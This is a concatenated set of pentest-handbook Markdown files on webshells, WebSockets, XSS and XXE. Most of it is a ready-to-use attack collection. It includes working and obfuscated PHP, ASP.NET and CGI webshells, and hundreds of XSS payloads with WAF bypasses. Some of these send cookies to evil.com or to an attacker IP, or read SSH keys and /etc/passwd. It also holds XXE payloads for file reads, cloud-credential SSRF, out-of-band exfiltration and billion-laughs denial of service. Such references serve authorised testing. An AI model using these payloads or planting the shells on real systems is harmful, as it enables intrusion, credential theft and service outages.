+
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/web-shells.md
+# Webshells
+
+{% embed url="https://www.localroot.net/" %}
+
+## **PHP**
+
+```php
+# system
+
+//CURL http://ip/shell.php?1=whoami
+//www.somewebsite.com/index.html?1=ipconfig
+
+// passthru 
+<?php passthru($_GET['cmd']); ?>
+
+// NINJA
+;").($_^"/"); ?> 
+http://target.com/path/to/shell.php?=function&=argument
+http://target.com/path/to/shell.php?=system&=ls
+
+// NINJA 2
+/'^'{{{{';@${$_}[_](@${$_}[__]);
+
+// One more
+<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+
+// https://github.com/Arrexel/phpbash
+// https://github.com/flozz/p0wny-shell
+```
+
+## **.NET**
+
+```aspnet
+<%@Page Language=”C#”%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[“c”],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%><%=p.StandardOutput.ReadToEnd()%>
+www.somewebsite.com/cgi-bin/a?ls%20/var
+```
+
+## **Bash**
+
+```bash
+#!/bin/sh
+echo;$_ `${QUERY_STRING/%20/ }`
+www.somewebsite.com/cgi-bin/a?ls%20/var
+```
+
+## aspx
+
+```bash
+# https://github.com/antonioCoco/SharPyShell
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/web-sockets.md
+# Web Sockets
+
+```
+WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.
+
+WebSocket connections are normally created using client-side JavaScript like the following:
+var ws = new WebSocket("wss://normal-website.com/chat");
+
+To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:
+GET /chat HTTP/1.1
+Host: normal-website.com
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+Connection: keep-alive, Upgrade
+Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+Upgrade: websocket
+
+If the server accepts the connection, it returns a WebSocket handshake response like the following:
+HTTP/1.1 101 Switching Protocols
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
+
+Several features of the WebSocket handshake messages are worth noting:
+• The Connection and Upgrade headers in the request and response indicate that this is a WebSocket handshake.
+• The Sec-WebSocket-Version request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
+• The Sec-WebSocket-Key request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
+• The Sec-WebSocket-Accept response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
+
+# Tool
+https://github.com/PalindromeLabs/STEWS
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/xss.md
+# XSS
+
+{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}
+
+{% hint style="info" %}
+Try XSS in every input field, host headers, url redirections, URI paramenters and file upload namefiles.
+
+Actions: phising through iframe, cookie stealing, always try convert self to reflected.
+{% endhint %}
+
+## Tools
+
+```bash
+# https://github.com/hahwul/dalfox
+dalfox url http://testphp.vulnweb.com/listproducts.php
+
+# https://github.com/KathanP19/Gxss
+# Replace every param value with word FUZZ
+echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
+
+# XSpear
+gem install XSpear
+XSpear -u 'https://web.com' -a
+XSpear -u 'https://www.web.com/?q=123' --cookie='role=admin' -v 1 -a -b https://six2dez.xss.ht -t 20
+XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -p test -v 1
+
+# Xira
+# https://github.com/xadhrit/xira
+python3 xira.py -u url
+
+# Hosting XSS
+# surge.sh
+npm install --global surge
+mkdir mypayload
+cd mypayload
+echo "alert(1)" > payload.js
+surge # It returns the url
+
+# XSS vectors
+https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+
+# Payload list
+https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt
+
+https://github.com/terjanq/Tiny-XSS-Payloads
+
+# XSS to RCE
+# https://github.com/shelld3v/JSshell
+
+# Polyglots
+# https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
+# XSS browser
+# https://github.com/RenwaX23/XSSTRON
+
+# Blind
+# https://github.com/hipotermia/vaya-ciego-nen
+```
+
+### Oneliners
+
+```bash
+# WaybackUrls
+echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe -b https://six2dez.xss.ht
+# Param discovery based
+paramspider -d target.com > /filepath/param.txt && dalfox -b https://six2dez.xss.ht file /filepath/param.txt 
+# Blind XSS
+cat target_list.txt | waybackurls -no-subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace -a | dalfox pipe -b https://six2dez.xss.ht
+# Reflected XSS
+echo "domain.com" | waybackurls | gf xss | kxss
+```
+
+## XSS recopilation
+
+### Basics
+
+```markup
+# Locators
+'';!--"<XSS>=&{()}
+
+# 101
+<script>alert(1)</script>
+<script>+-+-1-+-+alert(1)</script>
+<script>+-+-1-+-+alert(/xss/)</script>
+%3Cscript%3Ealert(0)%3C%2Fscript%3E
+%253Cscript%253Ealert(0)%253C%252Fscript%253E
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script src=data:&comma;alert(1)//
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+%5B'-alert(document.cookie)-'%5D
+```
+
+### By tag
+
+```markup
+# Tag filter bypass
+<svg/onload=alert(1)>
+<script>alert(1)</script>
+<script     >alert(1)</script>
+<ScRipT>alert(1)</sCriPt>
+<%00script>alert(1)</script>
+<script>al%00ert(1)</script>
+
+# HTML tags
+<img/src=x a='' onerror=alert(1)>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<img src=`x`onerror=alert(1)>
+<img src='/' onerror='alert("kalisa")'>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<BODY ONLOAD=alert('XSS')>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http:/evil.com/xss.js?< B >
+"><XSS<test accesskey=x onclick=alert(1)//test
+<svg><discard onbegin=alert(1)>
+<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
+<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
+
+# Other tags
+<BASE HREF="javascript:alert('XSS');//">
+<DIV STYLE="width: expression(alert('XSS'));">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<xss onclick="alert(1)">test</xss>
+<xss onmousedown="alert(1)">test</xss>
+<body onresize=alert(1)>”onload=this.style.width=‘100px’>
+<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
+
+# CharCode
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+# Input already in script tag
+@domain.com">user+'-alert`1`-'@domain.com
+
+# Scriptless
+<link rel=icon href="//evil?
+<iframe src="//evil?
+<iframe src="//evil?
+<input type=hidden type=image src="//evil?
+
+# Unclosed Tags
+<svg onload=alert(1)//
+```
+
+### Blind
+
+```markup
+# Blind XSS
+# https://github.com/LewisArdern/bXSS
+# https://github.com/ssl/ezXSS
+# https://xsshunter.com/
+
+# Blind XSS detection
+# Xsshunter payload in every field
+# Review forms
+# Contact Us pages
+# Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
+# Address fields of e-commerce sites
+# First or Last Name field while doing Credit Card Payments
+# Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
+# Log Viewers
+# Feedback Page
+# Chat Applications
+# Any app that requires user moderation
+# Host header
+# Why cancel subscription? forms
+```
+
+### Bypasses
+
+````markup
+# No parentheses
+<script>onerror=alert;throw 1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>location='javascript:alert\x281\x29'</script>
+<script>alert`1`</script>
+<script>new Function`X${document.location.hash.substr`1`}`</script>
+
+# No parentheses and no semicolons
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+
+# No parentheses and no spaces:
+<script>Function`X${document.location.hash.substr`1`}```</script>
+
+# Angle brackets HTML encoded (in an attribute)
+“onmouseover=“alert(1)
+‘-alert(1)-’
+
+# If quote is escaped
+‘}alert(1);{‘
+‘}alert(1)%0A{‘
+\’}alert(1);{//
+
+# Embedded tab, newline, carriage return to break up XSS
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+# RegEx bypass
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+
+# Other
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
+````
+
+### Encoded
+
+```markup
+# Unicode
+<script>\u0061lert(1)</script>
+<script>\u{61}lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+
+# Hex
+<script>eval('\x61lert(1)')</script>
+
+# HTML
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
+\’-alert(1)//
+
+# URL
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+
+# Double URL Encode
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+
+# Unicode + HTML
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+
+# HTML + URL
+<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
+```
+
+### Polyglots
+
+````markup
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/onerror=alert(2)>%5Cx3e
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
+￼￼```
+%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
+<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#
+jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">>
+” ></plaintext></|><plaintext/onmouseover=prompt(1) >prompt(1)@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>’ →” > "></script>alert(1)”><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">">
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+?msg=<img/src=`%00`%20onerror=this.onerror=confirm(1)
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+<sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”> <iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><imgsrc="http://i.imgur.com/P8mL8.jpg">
+
+# No parenthesis, back ticks, brackets, quotes, braces
+a=1337,b=confirm,c=window,c.onerror=b;throw-a
+
+# Another uncommon
+'-(a=alert,b="_Y000!_",[b].find(a))-'
+
+# Common XSS in HTML Injection
+<svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+"></tag><svg onload=alert(1)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+q=<script/&q=/src=data:&q=alert(1)>
+<script src=data:,alert(1)>
+# inline
+"onmouseover=alert(1) //
+"autofocus onfocus=alert(1) //
+# src attribute
+javascript:alert(1)
+# JS injection
+'-alert(1)-'
+'/alert(1)//
+\'/alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+/alert(1)//\
+/alert(1)}//\
+${alert(1)}
+
+# XSS onscroll
+<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
+
+# XSS filter bypasss polyglot:
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
+
+" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>
+" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>
+
+# GO SSTI
+{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`
+
+# Some XSS exploitations
+- host header injection through xss
+add referer: batman 
+hostheader: bing.com">script>alert(document.domain)</script><"
+- URL redirection through xss
+document.location.href="http://evil.com"
+- phishing through xss - iframe injection
+<iframe src="http://evil.com" height="100" width="100"></iframe>
+- Cookie stealing through xss
+https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
+https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
+<script>var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
+<img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;>
+<img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');">
+-  file upload  through xss
+upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
+-  remote file inclusion (RFI) through xss
+php?=http://brutelogic.com.br/poc.svg - xsspayload
+- convert self xss to reflected one
+copy response in a file.html -> it will work
+
+# XSS to SSRF
+<esi:include src="http://yoursite.com/capture" />
+
+# XSS to LFI
+<script>	x=new XMLHttpRequest;	x.onload=function(){		document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
+
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+````
+
+## XSS in files
+
+```markup
+# XSS in filename:
+"><img src=x onerror=alert(document.domain)>.gif
+
+# XSS in metadata:
+exiftool -FIELD=XSS FILE
+exiftool -Artist=' "><img src=1 onerror=alert(document.domain)>' brute.jpeg
+exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
+
+# XSS in GIF Magic Number:
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+# If image can't load:
+url.com/test.php?p=<script src=http://url.com/upload/img/xss.gif>
+
+# XSS in png:
+https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/
+
+# XSS in PDF:
+https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1
+
+# XSS upload filename:
+cp somefile.txt \"\>\<img\ src\ onerror=prompt\(1\)\>
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
+"><svg onload=alert(1)>.gif
+
+# XSS Svg Image upload
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('XSS!');
+   </script>
+</svg>
+
+# XSS svg image upload 2
+# If you're testing a text editor on a system that you can also upload files to, try to embed an svg:
+<iframe src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/movingcart_1.svg" frameborder="0"></iframe>
+#If that works, upload an SVG with the following content and try rendering it using the text editor:
+<svg xmlns="http://www.w3.org/2000/svg">
+    <script>alert(document.domain)</script>
+</svg>
+
+# XSS in SVG 3:
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+
+# XSS in XML
+<html>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
+</html>
+
+# https://brutelogic.com.br/blog/file-upload-xss/
+
+" ="" '></><script></script><svg onload"="alertonload=alert(1)"" onload=setInterval'alert\x28document.domain\x29'
+
+# XSS in existent jpeg:
+exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
+
+# XSS in url (and put as header)
+http://acme.corp/?redir=[URI_SCHEME]://gremwell.com%0A%0A[XSS_PAYLOAD]
+
+# XSS in XML
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+```
+
+## **DOM XSS**
+
+```markup
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<svg><svg onload=alert(1)>
+data:text/html,<img src=1 onerror=alert(1)>
+data:text/html,<iframe src=javascript:alert(1)>
+<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
+"><svg onload=alert(1)>
+javascript:alert(document.cookie)
+\"-alert(1)}//
+```
+
+## **XSS to CSRF**
+
+```markup
+# Example:
+
+# Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/email',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
+## **AngularJS Sandbox**
+
+```markup
+# Removed in AngularJS 1.6
+# Is a way to avoid some strings like window, document or __proto__.
+
+# Without strings:
+/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+# With CSP:
+
+<script>
+location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+
+# v 1.6 and up
+{{$new.constructor('alert(1)')()}}
+<x ng-app>{{$new.constructor('alert(1)')()}}
+
+{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor('import("https://six2dez.xss.ht")')()}}
+{{$on.constructor('alert(1)')()}}
+{{{}.")));alert(1)//"}}
+{{{}.")));alert(1)//"}}
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
+```
+
+## **XSS in JS**
+
+```markup
+# Inside JS script:
+</script><img src=1 onerror=alert(document.domain)>
+</script><script>alert(1)</script>
+
+# Inside JS literal script:
+'-alert(document.domain)-'
+';alert(document.domain)//
+'-alert(1)-'
+
+# Inside JS that escape special chars:
+If ';alert(document.domain)// is converted in \';alert(document.domain)//
+Use \';alert(document.domain)// to obtain \\';alert(document.domain)//
+\'-alert(1)//
+
+# Inside JS with some char blocked:
+onerror=alert;throw 1
+/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
+# Inside {}
+${alert(document.domain)}
+${alert(1)}
+```
+
+## XSS Waf Bypasses
+
+```markup
+# Only lowercase block
+<sCRipT>alert(1)</sCRipT>
+
+# Break regex
+<script>%0aalert(1)</script>
+
+# Double encoding
+%2522
+
+# Recursive filters
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# Inject anchor tag
+<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+
+# Bypass whitespaces
+<svg·onload=alert(1)>
+
+# Change GET to POST request
+
+# Imperva Incapsula
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
+<img/src="x"/onerror="[JS-F**K Payload]">
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
+
+# WebKnight
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+
+# F5 Big IP
+<body style="height:1000px" onwheel="[DATA]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
+<body style="height:1000px" onwheel="[JS-F**k Payload]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
+
+# Barracuda WAF
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+
+# PHP-IDS
+<svg+onload=+"[DATA]"
+<svg+onload=+"aler%25%37%34(1)"
+
+# Mod-Security
+<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+
+# Quick Defense:
+<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle="aler\u0074(1)">
+
+# Sucuri WAF
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+
+# Akamai
+1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
+<SCr%00Ipt>confirm(1)</scR%00ipt>
+# AngularJS
+{{constructor.constructor(alert 1 )()}} 
+```
+
+## XSS Mindmap
+
+![](../../.gitbook/assets/XSS2.png)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/xxe.md
+# XXE
+
+## Summary
+
+{% hint style="info" %}
+XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.
+{% endhint %}
+
+Detection:
+
+```markup
+# Content type "application/json" or "application/x-www-form-urlencoded" to "applcation/xml".
+# File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.
+# If svg allowed in picture upload, you can inject xml in svgs.
+# If the web app offers RSS feeds, add your milicious code into the RSS.
+# Fuzz for /soap api, some applications still running soap apis
+# If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse
+```
+
+Check:
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE a [<!ENTITY test "THIS IS A STRING!">]>
+<methodCall><methodName>&test;</methodName></methodCall>
+```
+
+If works, then:
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE a[<!ENTITY test SYSTEM "file:///etc/passwd">]>
+<methodCall><methodName>&test;</methodName></methodCall>
+```
+
+## Tools
+
+```markup
+# https://github.com/BuffaloWill/oxml_xxe
+# https://github.com/enjoiz/XXEinjector
+```
+
+## Attacks
+
+```markup
+# Get PHP file:
+<?xml version="1.0"?>
+<!DOCTYPE a [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<methodCall><methodName>&test;</methodName></methodCall>
+
+# Classic XXE Base64 encoded
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
+# Check if entities are enabled
+<!DOCTYPE replace [<!ENTITY test "pentest"> ]>
+ <root>
+  <xxe>&test;</xxe>
+ </root>
+
+# XXE LFI:
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
+# XXE Blind LFI:
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
+
+# XXE Access control bypass
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
+<foo><result>&ac;</result></foo>
+
+# XXE to SSRF:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+
+# XXE OOB
+<?xml version="1.0"?>
+<!DOCTYPE data [ 
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+ <!ENTITY % dtd SYSTEM "http://your.host/remote.dtd"> 
+%dtd;]>
+<data>&send;</data>
+
+# PHP Wrapper inside XXE
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue du CTF</adress>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
+]>
+<foo>&xxe;</foo>
+
+# Deny Of Service - Billion Laugh Attack
+
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+
